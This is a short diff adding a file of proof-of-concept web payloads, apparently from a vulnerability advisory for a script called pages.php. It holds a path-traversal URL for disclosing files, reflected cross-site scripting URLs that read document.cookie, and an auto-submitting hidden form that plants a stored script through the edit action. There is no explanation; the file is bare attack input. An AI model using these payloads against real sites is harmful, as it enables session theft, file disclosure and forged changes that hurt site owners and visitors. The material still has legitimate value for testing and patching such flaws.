@@ -1,0 +1,18 @@
+Information-disclosure:
+
+http://www.example.com/pages.php?id=./../../../../../txt_file
+
+Cross-site scripting:
+
+http://www.example.com/pages.php?id=index&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/pages.php?action=edit&amp;id=27-01-2011&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+HTML-injection:
+
+&lt;form action=&quot;http://host/pages.php?action=edit&amp;id=index&amp;title=index&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;data[text]&quot; value=&#039;text&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
